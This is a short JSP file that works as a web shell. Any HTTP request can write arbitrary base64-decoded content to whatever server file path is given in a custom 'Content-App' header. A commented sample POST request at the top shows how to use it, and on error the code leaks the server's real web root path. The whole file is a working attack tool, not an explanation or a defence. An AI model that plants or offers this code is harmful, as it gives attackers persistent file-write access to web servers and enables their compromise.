<!-- 

POST /writefile.jsp HTTP/1.1
Host: HOSTNAME
Connection: close
Content-APP: D:\path\file.jsp
Content-Length: 13

YmFzZTY0Cg==

-->
<%
try{
new java.io.PrintWriter(request.getHeader("Content-App")).print(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream()));
}catch (Exception e){
    out.println(request.getSession().getServletContext().getRealPath(""));
}
%>